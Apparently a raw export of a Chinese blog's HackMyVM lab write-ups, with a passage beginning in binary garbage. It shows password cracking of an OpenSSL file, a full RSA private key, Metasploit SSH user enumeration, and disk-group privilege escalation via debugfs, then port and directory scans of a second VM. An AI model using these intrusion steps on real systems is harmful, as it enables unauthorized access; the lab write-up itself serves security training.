                                                                                                                                                @<span class="token punctuation">(</span>�ea�j�<span class="token punctuation">)</span><span class="token operator">></span>�%<span class="token variable"><span class="token variable">`</span>,��:�a�8��<span class="token string">'�L�6��o��6����]�x�Y�+I���L:����@�s�
D��gS\��@���5�Y�����M>����o��!#�\t▒�>>���:JrL���g�xԎ�#W�\6�H�V�wUE�S��d���'</span>O$��X�<span class="token comment">#��#�$���������ъ�X��f��ka�9</span><span class="token variable">`</span></span>�fJ�����u�<span class="token operator"><span class="token file-descriptor important">5</span>></span>���<span class="token punctuation">(</span>MRGʏs<span class="token operator">&amp;</span>��y��
ro�%���:D�      ��P� �<span class="token operator">></span>��o0<span class="token operator">|</span>@<span class="token comment">#���~���S��O��X!��y�us��c'���:Zј���P�������E�������6W6E�i&lt;eQ!�▒���~m��]�Y>/bFz�����H�qM�%�▒�\��D+!d�ժ�It�m� ;�C���b��O6Aڅ��US�>�!O����DxqJ���J �;oR�8npm�d��(1�����</span>
                                                                            J1ŗ�Bg�n<span class="token variable"><span class="token variable">`</span>�l�XU�Toդ▒▒�<span class="token operator">&amp;</span>@�▒�<span class="token punctuation">[</span>f��<span class="token operator">&amp;</span>�m<span class="token operator">!</span>�<span class="token operator">></span>���t��<span class="token punctuation">[</span>8e3?<span class="token variable">`</span></span>���M����bY��m�7������<span class="token punctuation">;</span>�zf%▒C��Nд�6<span class="token variable"><span class="token variable">`</span>�*<span class="token variable">`</span></span>��L��Wj��<span class="token variable"><span class="token variable">`</span>����H�j<span class="token comment">#&#123;�������3H������G�1 ��s&#125;"Հl��c�▒))�z����8�uӁ�</span><span class="token variable">`</span></span>��B�N��Z��e�0W�v.���������ߪ�Q,.�<span class="token punctuation">;</span>~����8��sB�Ws�����A����o�Kk�Z�b�<span class="token operator">></span>$~��0a�׊O�1sZ6��j��<span class="token punctuation">&#123;</span>�⎡iHuA<span class="token punctuation">]</span>r�^<span class="token punctuation">;</span>�l��<span class="token punctuation">&#123;</span>S�����+�<span class="token operator">=</span>�<span class="token punctuation">[</span>j�rFM�  ,�ڎ��▒��f�q�d�D���9j<span class="token punctuation">\</span>�  ~�.��J  w<span class="token operator">!</span>.<span class="token punctuation">;</span>▒���8�.��B��g��<span class="token operator">></span>uG<span class="token punctuation">;</span>�P�<span class="token operator">></span>�H<span class="token operator">|</span>�
                                                                                               �W�F8�oάG<span class="token punctuation">&#123;</span>��?qG����G퐍��<span class="token operator">=</span>��<span class="token comment">#                                                                                                                                                                                                </span>
 ~/Desktop                                                                                                                                                                                                                                                                                           root@kali2  <span class="token number">19</span>:45:07 
<span class="token operator">></span> <span class="token function">file</span> bbb          
bbb: openssl enc'd data with salted password</code></pre>
<p>发现是openssl密文，爆破一下密码，用sha256签名跑了出来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> bruteforce-salted-openssl bbb <span class="token parameter variable">-f</span> /usr/share/wordlists/rockyou.txt  <span class="token parameter variable">-d</span> sha256
Warning: using dictionary mode, ignoring options -b, -e, -l, <span class="token parameter variable">-m</span> and -s.

Tried passwords: <span class="token number">89944</span>
Tried passwords per second: inf
Last tried password: amoajesus

Password candidate: amoajesus</code></pre>
<p>拿到密码<code>amoajesus</code>,然后根据这个密码拿私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> openssl  enc -aes-256-cbc <span class="token parameter variable">-d</span> <span class="token parameter variable">-in</span> bbb <span class="token parameter variable">-out</span> ccc
enter AES-256-CBC decryption password:
*** WARNING <span class="token builtin class-name">:</span> deprecated key derivation used.
Using <span class="token parameter variable">-iter</span> or <span class="token parameter variable">-pbkdf2</span> would be better.

 ~/Desktop                                                                                                                                                                                   root@kali2  <span class="token number">20</span>:03:26 
<span class="token operator">></span> <span class="token function">cat</span> ccc
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4jJ321FfmddxmAyA+EUtxfMApwY32Zs1THtaWbU4jZ10Mzh8
/nRSWdXECqE5naPeNbUarNMYj2QIm3kn1w5LTB+RGYuZBfJixmD15dnQly5AOBG5
p02yHVDKPQ7DAmjRtgYav0n8UHp5wAu2wwQDthxv8soGwqdbPV+Ly+zfePjclcIX
5KMrdBasiuUr5RRGCtzspdfXC3tqD8HgWThXN8hLenyGPXA/r0g/bRj7l5W8Pqre
mk8HkxDO+vrPRgNvqo3Z2hSXulw1dGTkMuwDEkEXUPxqDXGPzzh5o6h6/2vw6HeJ
3Ik1XXumWsWPZRU0j3a98Z4woMfCN5agN7GqGwIDAQABAoIBAHdip7wL4OdzvLLB
trhS2uvla+y77XJe5uytFmzOp0CnYBNAt0gd4PElUElD+wLm4Ht8UM3yxL250Iku
kwaAtuFAr/bJpURsQBHwTxi3s853TNHLGS/iZCXw5C0Bw49b/4ORCUD5LcDUQ7pG
9HlNfx/5NmTwmEzYw+FKsqA5L2HLCWLLIhArWYOUTpc/4dLzfILRS0wBidEWF/x9
S+PCQdSUOrXfIKyt6dhZRDBMQbCas0uDvTF+qh5VEPX8niK91iG7zaD45RYG1hm+
9jaihCE0M1/pBnMj/REmFupQb9BKs6lPepjtoC4uaSRsZI5P+7lq11wZMjjXDpH+
AfofscECgYEA/G4XDgZPAZW7bMt1xYICioj/woD3edP+6U2XAcJ9sLYBLLck2Tp9
TeHvGAjvbglTiSJYzGFAdPqZxixnCqzrv/Bnsg5hPp7oqtN4liZxtfwyLP10Y7oT
+oO1yJFn/ZRyN2QRUSLOusLIcDTg6mwI64q2rm1dijIGpbCAJnTeXqsCgYEA5WVn
PTyIZut46TBuC4a/QodP/1eJkRQFgIRvC2a9c3atB5FQIziwymmD/J3myAgqKXkT
rPfiiiasal+rUSW9suXf4WROEpV26lk+fFZkswtPQVTYg9/r+f/GbM04aDdQFGay
uAT3FbNipkB+5zxsLA44JKli9W4ye+so3CJJIlECgYEA25QoGdsC/q3wy0Jwv83H
yBpD4D2vCBqQswD7SlyUWRL5Epx9QTjPpt/Ry2Z6X41dTPzDoYU3PIqBGRGm0HJ6
4AuPKCO6E27HlVE+o93tLBCk1N3kUJucpV3M0xspCjwG3of9SEau7WZiVLiqrUAs
wjd3kWMw6vV5MsfFsa4XgOECgYEAz5/hOl6wgp67+CuaXppeP+Pi9xSO8Z2ygSjc
rPAXpwsR/xh59PcZpIquKJXuTLx/FLx+n35ZL3tjcIAYukCzmtlOsl0sAMwBLokJ
8lXrnNYurM4TjgC9P7BOMynn1QPDWkO9nKr5zE1pi1oywi5BJfrUu/IIHGXaEai9
eckacpECgYA8xTCDoliocyinyJ7EdI4J0/pgbHEcwJ3XeZCh+WyDJZGB/6cSGyI8
isAZnRCL0ml2ukrq+mdQ2WjSQLxNZGrM0ePxl5Qvv2Bzeyn2gSKInQlYZ5rAItkR
i3gLubHaM/au4vhu65nmM5ni7R9bUKZ3sXR74+tXlKXsupuwJR0aDA<span class="token operator">==</span>
-----END RSA PRIVATE KEY-----</code></pre>
<p>拿到私钥了，但是没用用户名,用msf上面的ssh用户名枚举</p>
<h2 id="ssh用户名枚举"><a href="#ssh用户名枚举" class="headerlink" title="ssh用户名枚举"></a>ssh用户名枚举</h2><pre class="language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.1.104
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.104
msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
USER_FILE <span class="token operator">=</span><span class="token operator">></span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Using malformed packet technique
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Checking <span class="token keyword">for</span> <span class="token boolean">false</span> positives
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Starting scan
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'mail'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'root'</span> found
^C<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Caught interrupt from the console<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_enumusers<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Using malformed packet technique
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Checking <span class="token keyword">for</span> <span class="token boolean">false</span> positives
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - Starting scan
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'mail'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'root'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'news'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'man'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'bin'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'games'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'nobody'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'abraham'</span> found
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.104:22 - SSH - User <span class="token string">'backup'</span> found</code></pre>
<p>拿到一个用户名<code>abraham</code></p>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">chmod</span> <span class="token number">600</span> ccc                

 ~/Desktop                                                                                                                                                                                   root@kali2  <span class="token number">20</span>:34:20 
<span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> ccc abraham@192.168.1.104
Last login: Sun Jun <span class="token number">20</span> <span class="token number">11</span>:36:51 <span class="token number">2021</span> from <span class="token number">192.168</span>.0.28
abraham@nightfall:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">44</span>
drwx------ <span class="token number">5</span> abraham disk <span class="token number">4096</span> Jun <span class="token number">20</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root    root <span class="token number">4096</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root    root    <span class="token number">9</span> Jun <span class="token number">20</span>  <span class="token number">2021</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> abraham disk  <span class="token number">220</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> abraham disk <span class="token number">3526</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .bashrc
drwx------ <span class="token number">3</span> abraham disk <span class="token number">4096</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .gnupg
drwxr-xr-x <span class="token number">3</span> abraham disk <span class="token number">4096</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .local
-rw-r--r-- <span class="token number">1</span> abraham disk  <span class="token number">807</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .profile
-rw-r--r-- <span class="token number">1</span> abraham disk   <span class="token number">66</span> Jun <span class="token number">12</span>  <span class="token number">2021</span> .selected_editor
drwx------ <span class="token number">2</span> abraham disk <span class="token number">4096</span> Jun <span class="token number">20</span>  <span class="token number">2021</span> .ssh
-rw-r--r-- <span class="token number">1</span> abraham disk <span class="token number">2294</span> Jun <span class="token number">20</span>  <span class="token number">2021</span> door.txt
-rwx------ <span class="token number">1</span> abraham disk   <span class="token number">33</span> Jun <span class="token number">20</span>  <span class="token number">2021</span> user.txt
abraham@nightfall:~$ </code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">abraham@nightfall:~$ <span class="token function">cat</span> door.txt 
U2FsdGVkX1+sO5zqP533uCKtFYoSEEU41j01PSMGlBMiJ2v7ksXTzgHC5Dx2Nzc/uc0RZ6jLviSy
7051GAeGpOyxB4r4eYYyoOCanUnjYgM1FYcGUvm7kf4YcLIpkuuxaa33kPKLtzqwB9Tt5zven6Mt
bRAI1BIT6drP/BwtqtrhuufKRv19XAqbZ6vHPIz5weJeH4DLbjbzuj9ZuHBXx+D0FzNPB1cHgDvP
w1tqUnQ0ddHRsk4lxjwhWxAcOPD/n7KKSPiNf9+PAoDtPuwhv8a7eC1JCwASOi2enU8XMgdExh7R
sQ6Ktoa/RPodc5k/HA7NPTBvtqcZKm7NBf8JiAIY6CmXZRxSa2tkSiEW1WMsQfV53vwX+q5QZLP9
AFdywQiC6qPQBN1c0ut8qhVPd5zzcbj1u1wpLTBBf5T6OWAmZ/v3vRXpqhg44tLMGnfb+PsD1T+l
1UArpYENR+/OSVSmsdroURQZd1/11ZJCMiqJK7iUjiIIMBdJIvd9jiAcA7qJUsvrggo3az83xjOh
sQaJLLqBFUn6C5GfRrgQAIkz7p5RPsGGeroqljYLLm27MTXg/JtDyKJ0x9F51PCazIEe83a+EHad
Yxo71TDgTu1SE/L8+QJ3uhPJ8AzxaJDGMAbmki/WcpLYOmnlMhTrJNE8nSWiXMyuE6gf8FhHhogy
qRFkdsuywdhEwUx41dFYGTpfJPK6Mn5TLW5eYJgKTSeCgJvG/ilokCQxzl6gEccvdd108p5kyWkW
kV2bJsFCipQ0f6tvfBt7jCPWVT+nAPUUu4jMwUC9nX78LC2H6qrAMRZha3GNqxfSNi1xOHuVQ4Ik
gwK9BFhlt9WWGbxk9k9JLW+vE19HSYYtaqFJTbUVsW3lzgm4SmesCJV1dz/rwzGF765qs+u1FjPp
oe1WdwAYyoa2Dzv8xgg789zg2UZ64yj3BTxBDEAopWVh82rBKT6jJWAVLJq+OqVhjzjgjifVTKs2
q41vD6nBNvXk4uFdiHixWfERK0kT1e7aFUw6qufq9UCAc7kKsW7piVp2NINWGkAIK2TduBtAfwia
dYVSn5skcDhalBHw4PsklrQXAbjMLsqmfWmz8yENmrlQqEPiL0SKMhY7uij4tQ/g/3CXs3mrk3wB
EG46IKP4IRIjqMv3ZK+tYLG2buyBfhkopCdgoT7sFIT/wVcGiVw2D/tIwVbOd1VF0RRTvYkEZKjQ
Fo0nTySgo1i7I8DSI9kk6LXw+ccTpYCa8NGKmVjC2mYfiPlrHGHwOWDnZkoXtrmskOp1rzU+4he6
6CgBTVIPR8qPcyb8zXnpyQ1EjN1nU1yqpEDQ+aw1jlndE6f6gokATT7k+pnHbwkZXAJ0Grk+FT7m
mt86SnJM86DLZ694FNSOywYjDGBb7mJKJKfHb6dsAc7Gq6n+vk7ldBol4Kjr7BSjNlc2RaxpPBV/
ZVEhvBqxobx+Bm2Byl2RWVEIG0o+FS9iRnr/4tQA5I4TSLZxTewl6hob1/9cvPVEKyFkvdWqqkl0
zG36IDu2Q6iHy2Luz082FkHahbGxVVP6Aj5/0iFP+7q+rUR4cUqThIpKIPw7b1LJOG5wbZxk4rAo
Mb2o7s/HDXJv6SXzlP86OQhEywmL2VDtIMU+uexvMHxAI/68w37l7fhTq69PhvZYIZnKedp1c6j3
YycQp5zQOlrRmKPkpBJQ6/uapp1/k/xFuvDGDEoxxZcOjUJn825g7mzkWM2aVQG2VG/chAjVpBoY
kyZA1BjsW2bkqib9bSGnPtP5E6h0rutbOGUzP2Dw3elNug6MoqQfYlmqjG3LN6DA5ZPhB887gnpm
JRhDmNBO0LSKNmCOKmCp4MyLTKaOV2rymGCu4/eGSJFqI3vvvPGDohuTvtcz0oNI3BtM/6GIhbNH
uzEJu8FzfSLVgGzjqWP9Gikpz3qN5PGlOBfqddOB62D31kK9TojCBQBao8dlFvowV/0Udi7845LI
9x3bBPvp2QPfqpVRLC6PO379wYv5ARE4sNujunNCyldzsu/5m6JBkYDz5wZvpEtrlBJax2L4FT4k
fsG3MGHv14pPtzFzWjbZ0wBq5dl7ieKOoWlIdUFdctJeO8NskO97U44Hq/7r1CuzPYNbav1yRk29
CRwsEqLajoO2Ghuuutpm2nGCZOBEqc74OWpcgwl+/y7nuUoJdyEuOxi60eY4FM0u6pxC++dnkLs+
dQRHO9RQtj7tSHyvDNxX60Y46W/OrEd7p7Y/cUeRnu/SRwHtkI2jmj2prA<span class="token operator">==</span></code></pre>
<p>这个就是广播的文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">abraham@nightfall:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>abraham<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">(</span>disk<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">(</span>disk<span class="token punctuation">)</span></code></pre>
<p>看到这个用户所属组是disk,在Hacktrick上面找到了相关信息<br><img src="https://ooo.0x0.ooo/2024/07/21/ORPEvX.png" alt="ORPEvX.png" loading="lazy"><br>Disk组类似有root的权限，可以访问机器的所有数据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">abraham@nightfall:~$ /usr/sbin/debugfs /dev/sda1
debugfs <span class="token number">1.44</span>.5 <span class="token punctuation">(</span><span class="token number">15</span>-Dec-2018<span class="token punctuation">)</span>
debugfs:  <span class="token function">cat</span> /root/root.txt
*****</code></pre>







]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>udp</tag>
        <tag>openssl</tag>
        <tag>disk</tag>
        <tag>debugfs</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Principle</title>
    <url>/posts/85f65919/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.158</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.158 -sV -A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-21 <span class="token number">19</span>:08 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.158
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00059s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">999</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.22</span>.1
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry 
<span class="token operator">|</span>_/hackme
<span class="token operator">|</span>_http-title: Welcome to nginx<span class="token operator">!</span>
<span class="token operator">|</span>_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:97:72:0A <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose<span class="token operator">|</span>storage-misc
Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X<span class="token operator">|</span><span class="token number">2.6</span>.X<span class="token operator">|</span><span class="token number">3</span>.X <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Synology DiskStation Manager <span class="token number">5</span>.X <span class="token punctuation">(</span><span class="token number">90</span>%<span class="token punctuation">)</span>, Netgear RAIDiator <span class="token number">4</span>.X <span class="token punctuation">(</span><span class="token number">87</span>%<span class="token punctuation">)</span>
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28
Aggressive OS guesses: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.0</span> - <span class="token number">5.4</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.0</span> - <span class="token number">5.5</span> <span class="token punctuation">(</span><span class="token number">95</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.10</span> - <span class="token number">4.11</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">3.4</span> - <span class="token number">3.10</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">5.1</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 - <span class="token number">3.10</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Linux <span class="token number">2.6</span>.32 - <span class="token number">3.13</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.59</span> ms <span class="token number">192.168</span>.56.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">20.07</span> seconds</code></pre>
<p>只有80端口开放了,好好好,直接去web看</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><a href="https://img.tg/image/Opi7xC"><img src="https://ooo.0x0.ooo/2024/04/21/Opi7xC.png" alt="Opi7xC.png" loading="lazy"></a><br>是一个nginx的default界面</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.158 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.158
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">68</span><span class="token punctuation">]</span>
/hi.html              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">141</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
